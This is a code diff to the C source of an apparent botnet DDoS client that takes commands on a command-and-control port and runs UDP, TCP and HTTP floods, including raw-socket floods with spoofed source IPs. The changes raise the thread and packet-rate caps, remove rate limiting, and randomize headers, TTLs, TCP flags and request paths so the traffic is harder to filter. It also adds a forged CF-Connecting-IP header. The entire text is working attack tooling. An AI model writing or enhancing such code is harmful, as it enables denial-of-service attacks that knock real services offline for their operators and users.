@@ -29,9 +29,9 @@
 #define CNC_PORT 4087
 #define MAX_PACKET 65535
 #define MAX_THREADS 500
-#define DEFAULT_THREADS 100
+#define DEFAULT_THREADS 350
 #define DEFAULT_SIZE 1400
-#define DEFAULT_PPS 1000000
+#define DEFAULT_PPS 2000000
 #define DEFAULT_DELAY 1
 
 static int sock = -1;
@@ -182,6 +182,7 @@ void build_http_request(char *buffer, char *host, char *path, int size, int ua_i
     int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
     int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
     int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
+    int r13 = rand() % 255, r14 = rand() % 255, r15 = rand() % 255, r16 = rand() % 255;
     
     snprintf(buffer, size,
         "GET %s HTTP/1.1\r\n"
@@ -197,10 +198,12 @@ void build_http_request(char *buffer, char *host, char *path, int size, int ua_i
         "X-Forwarded-For: %d.%d.%d.%d\r\n"
         "X-Real-IP: %d.%d.%d.%d\r\n"
         "X-Client-IP: %d.%d.%d.%d\r\n"
+        "CF-Connecting-IP: %d.%d.%d.%d\r\n"
+        "CF-IPCountry: US\r\n"
         "Referer: http://%s/\r\n"
         "\r\n",
         path, host, user_agents[ua_index % NUM_USER_AGENTS],
-        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12,
+        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, r13, r14, r15, r16,
         host
     );
 }
@@ -214,8 +217,7 @@ void *udp_flood(void *arg) {
     time_t end_time;
     int sent_count = 0;
     int pps_per_thread = args->pps / active_threads + 10;
-    uint64_t start_time = time(NULL) * 1000000ULL;
-    int packets_this_sec = 0;
+    int packet_counter = 0;
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
@@ -242,25 +244,19 @@ void *udp_flood(void *arg) {
     end_time = time(NULL) + args->duration;
 
     while (attack_running && time(NULL) < end_time) {
-        random_payload((unsigned char *)packet, packet_size);
+        int current_size = packet_size - (rand() % 200);
+        if (current_size < 64) current_size = 64;
+        random_payload((unsigned char *)packet, current_size);
         
-        int result = sendto(sockfd, packet, packet_size, 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
+        sendto(sockfd, packet, current_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
+        packets_sent++;
+        bytes_sent += current_size;
+        sent_count++;
+        packet_counter++;
         
-        if (result > 0) {
-            packets_sent++;
-            bytes_sent += result;
-            sent_count++;
-            packets_this_sec++;
-        }
-
-        if (packets_this_sec >= pps_per_thread) {
-            uint64_t now = time(NULL) * 1000000ULL;
-            if (now - start_time < 1000000ULL) {
-                usleep(1000000ULL - (now - start_time));
-            }
-            packets_this_sec = 0;
-            start_time = time(NULL) * 1000000ULL;
+        if (packet_counter >= 512) {
+            sched_yield();
+            packet_counter = 0;
         }
     }
 
@@ -277,8 +273,7 @@ void *tcp_flood(void *arg) {
     time_t end_time;
     int sent_count = 0;
     int pps_per_thread = args->pps / active_threads + 10;
-    uint64_t start_time = time(NULL) * 1000000ULL;
-    int packets_this_sec = 0;
+    int packet_counter = 0;
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
@@ -315,16 +310,12 @@ void *tcp_flood(void *arg) {
             packets_sent++;
             bytes_sent += packet_size;
             sent_count++;
-            packets_this_sec++;
+            packet_counter++;
         }
 
-        if (packets_this_sec >= pps_per_thread) {
-            uint64_t now = time(NULL) * 1000000ULL;
-            if (now - start_time < 1000000ULL) {
-                usleep(1000000ULL - (now - start_time));
-            }
-            packets_this_sec = 0;
-            start_time = time(NULL) * 1000000ULL;
+        if (packet_counter >= 256) {
+            sched_yield();
+            packet_counter = 0;
         }
     }
 
@@ -341,8 +332,9 @@ void *http_flood(void *arg) {
     time_t end_time;
     int sent_count = 0;
     int pps_per_thread = args->pps / active_threads + 10;
-    uint64_t start_time = time(NULL) * 1000000ULL;
-    int packets_this_sec = 0;
+    int packet_counter = 0;
+    char *paths[] = {"/", "/index.php", "/api/v1/", "/admin/", "/login/", "/wp-admin/", "/home/", "/about/", "/contact/", "/products/", "/images/", "/css/", "/js/", "/fonts/", "/download/", "/upload/", "/user/", "/profile/", "/settings/", "/dashboard/"};
+    int num_paths = sizeof(paths) / sizeof(paths[0]);
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
@@ -365,6 +357,7 @@ void *http_flood(void *arg) {
     end_time = time(NULL) + args->duration;
 
     while (attack_running && time(NULL) < end_time) {
+        strcpy(args->path, paths[rand() % num_paths]);
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
         
         int conn = socket(AF_INET, SOCK_STREAM, 0);
@@ -376,16 +369,12 @@ void *http_flood(void *arg) {
             packets_sent++;
             bytes_sent += strlen(http_request);
             sent_count++;
-            packets_this_sec++;
+            packet_counter++;
         }
 
-        if (packets_this_sec >= pps_per_thread) {
-            uint64_t now = time(NULL) * 1000000ULL;
-            if (now - start_time < 1000000ULL) {
-                usleep(1000000ULL - (now - start_time));
-            }
-            packets_this_sec = 0;
-            start_time = time(NULL) * 1000000ULL;
+        if (packet_counter >= 256) {
+            sched_yield();
+            packet_counter = 0;
         }
     }
 
@@ -406,9 +395,8 @@ void *udp_raw_flood(void *arg) {
     int sent_count = 0;
     int error_count = 0;
     int pps_per_thread = args->pps / active_threads + 10;
-    uint64_t start_time = time(NULL) * 1000000ULL;
-    int packets_this_sec = 0;
     int current_size;
+    int packet_counter = 0;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
@@ -439,7 +427,7 @@ void *udp_raw_flood(void *arg) {
     end_time = time(NULL) + args->duration;
 
     while (attack_running && time(NULL) < end_time) {
-        current_size = args->packet_size - (rand() % 200);
+        current_size = args->packet_size - (rand() % 400);
         if (current_size < 64) current_size = 64;
         packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + current_size;
 
@@ -449,11 +437,11 @@ void *udp_raw_flood(void *arg) {
 
         ip_header->ihl = 5;
         ip_header->version = 4;
-        ip_header->tos = 0;
+        ip_header->tos = rand() % 256;
         ip_header->tot_len = htons(packet_size);
         ip_header->id = htons(rand() & 0xFFFF);
         ip_header->frag_off = 0;
-        ip_header->ttl = 255;
+        ip_header->ttl = rand() % 256;
         ip_header->protocol = IPPROTO_UDP;
         ip_header->check = 0;
         ip_header->saddr = random_ip();
@@ -467,29 +455,15 @@ void *udp_raw_flood(void *arg) {
         random_payload(payload, current_size);
         ip_header->check = checksum((unsigned short *)packet, packet_size);
 
-        int result = sendto(sockfd, packet, packet_size, 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
+        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
+        packets_sent++;
+        bytes_sent += packet_size;
+        sent_count++;
+        packet_counter++;
         
-        if (result > 0) {
-            packets_sent++;
-            bytes_sent += result;
-            sent_count++;
-            packets_this_sec++;
-        } else {
-            error_count++;
-            if (errno == EPERM || errno == EACCES) {
-                close(sockfd);
-                return NULL;
-            }
-        }
-
-        if (packets_this_sec >= pps_per_thread) {
-            uint64_t now = time(NULL) * 1000000ULL;
-            if (now - start_time < 1000000ULL) {
-                usleep(1000000ULL - (now - start_time));
-            }
-            packets_this_sec = 0;
-            start_time = time(NULL) * 1000000ULL;
+        if (packet_counter >= 512) {
+            sched_yield();
+            packet_counter = 0;
         }
     }
 
@@ -508,8 +482,9 @@ void *tcp_raw_flood(void *arg) {
     time_t end_time;
     int sent_count = 0;
     int pps_per_thread = args->pps / active_threads + 10;
-    uint64_t start_time = time(NULL) * 1000000ULL;
-    int packets_this_sec = 0;
+    int packet_counter = 0;
+    int flags[4] = {1, 2, 4, 16};
+    int flag_count = 4;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sockfd < 0) {
@@ -546,11 +521,11 @@ void *tcp_raw_flood(void *arg) {
 
         ip_header->ihl = 5;
         ip_header->version = 4;
-        ip_header->tos = 0;
+        ip_header->tos = rand() % 256;
         ip_header->tot_len = htons(packet_size);
         ip_header->id = htons(rand() & 0xFFFF);
         ip_header->frag_off = 0;
-        ip_header->ttl = 255;
+        ip_header->ttl = rand() % 256;
         ip_header->protocol = IPPROTO_TCP;
         ip_header->check = 0;
         ip_header->saddr = random_ip();
@@ -559,34 +534,30 @@ void *tcp_raw_flood(void *arg) {
         tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
-        tcp_header->ack_seq = 0;
+        tcp_header->ack_seq = rand();
         tcp_header->doff = 5;
-        tcp_header->syn = 1;
-        tcp_header->ack = rand() % 2;
-        tcp_header->rst = rand() % 2;
-        tcp_header->window = htons(65535);
+        
+        int flag = flags[rand() % flag_count];
+        tcp_header->syn = (flag & 1) ? 1 : 0;
+        tcp_header->ack = (flag & 2) ? 1 : 0;
+        tcp_header->rst = (flag & 4) ? 1 : 0;
+        tcp_header->psh = (flag & 16) ? 1 : 0;
+        
+        tcp_header->window = htons(rand() % 65535);
         tcp_header->check = 0;
         tcp_header->urg_ptr = 0;
 
         ip_header->check = checksum((unsigned short *)packet, packet_size);
 
-        int result = sendto(sockfd, packet, packet_size, 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
+        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
+        packets_sent++;
+        bytes_sent += packet_size;
+        sent_count++;
+        packet_counter++;
         
-        if (result > 0) {
-            packets_sent++;
-            bytes_sent += result;
-            sent_count++;
-            packets_this_sec++;
-        }
-
-        if (packets_this_sec >= pps_per_thread) {
-            uint64_t now = time(NULL) * 1000000ULL;
-            if (now - start_time < 1000000ULL) {
-                usleep(1000000ULL - (now - start_time));
-            }
-            packets_this_sec = 0;
-            start_time = time(NULL) * 1000000ULL;
+        if (packet_counter >= 512) {
+            sched_yield();
+            packet_counter = 0;
         }
     }
 
@@ -608,9 +579,8 @@ void *http_raw_flood(void *arg) {
     int ua_counter = rand() % NUM_USER_AGENTS;
     int sent_count = 0;
     int pps_per_thread = args->pps / active_threads + 10;
-    uint64_t start_time = time(NULL) * 1000000ULL;
-    int packets_this_sec = 0;
-    char *paths[] = {"/", "/index.php", "/api/v1/", "/admin/", "/login/", "/wp-admin/", "/home/", "/about/", "/contact/", "/products/"};
+    int packet_counter = 0;
+    char *paths[] = {"/", "/index.php", "/api/v1/", "/admin/", "/login/", "/wp-admin/", "/home/", "/about/", "/contact/", "/products/", "/images/", "/css/", "/js/", "/fonts/", "/download/", "/upload/", "/user/", "/profile/", "/settings/", "/dashboard/", "/api/v2/", "/v1/", "/v2/", "/test/", "/dev/", "/stage/", "/prod/", "/backup/", "/temp/", "/cache/"};
     int num_paths = sizeof(paths) / sizeof(paths[0]);
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -659,11 +629,11 @@ void *http_raw_flood(void *arg) {
 
         ip_header->ihl = 5;
         ip_header->version = 4;
-        ip_header->tos = 0;
+        ip_header->tos = rand() % 256;
         ip_header->tot_len = htons(packet_size);
         ip_header->id = htons(rand() & 0xFFFF);
         ip_header->frag_off = 0;
-        ip_header->ttl = 255;
+        ip_header->ttl = rand() % 256;
         ip_header->protocol = IPPROTO_TCP;
         ip_header->check = 0;
         ip_header->saddr = random_ip();
@@ -672,36 +642,27 @@ void *http_raw_flood(void *arg) {
         tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
-        tcp_header->ack_seq = 0;
+        tcp_header->ack_seq = rand();
         tcp_header->doff = 5;
         tcp_header->syn = 1;
         tcp_header->ack = rand() % 2;
         tcp_header->rst = rand() % 2;
-        tcp_header->window = htons(65535);
+        tcp_header->window = htons(rand() % 65535);
         tcp_header->check = 0;
         tcp_header->urg_ptr = 0;
 
         memcpy(payload, http_request, http_len);
-
         ip_header->check = checksum((unsigned short *)packet, packet_size);
 
-        int result = sendto(sockfd, packet, packet_size, 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
+        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
+        packets_sent++;
+        bytes_sent += packet_size;
+        sent_count++;
+        packet_counter++;
         
-        if (result > 0) {
-            packets_sent++;
-            bytes_sent += result;
-            sent_count++;
-            packets_this_sec++;
-        }
-
-        if (packets_this_sec >= pps_per_thread) {
-            uint64_t now = time(NULL) * 1000000ULL;
-            if (now - start_time < 1000000ULL) {
-                usleep(1000000ULL - (now - start_time));
-            }
-            packets_this_sec = 0;
-            start_time = time(NULL) * 1000000ULL;
+        if (packet_counter >= 512) {
+            sched_yield();
+            packet_counter = 0;
         }
     }
 
@@ -763,7 +724,7 @@ void start_attack(char *cmd) {
     if (parsed < 8) delay = DEFAULT_DELAY;
     
     if (threads > MAX_THREADS) threads = MAX_THREADS;
-    if (pps > 1000000) pps = 1000000;
+    if (pps > 3000000) pps = 3000000;
     if (size > 65507) size = 65507;
     if (size < 64) size = 64;
     if (delay < 0) delay = 0;
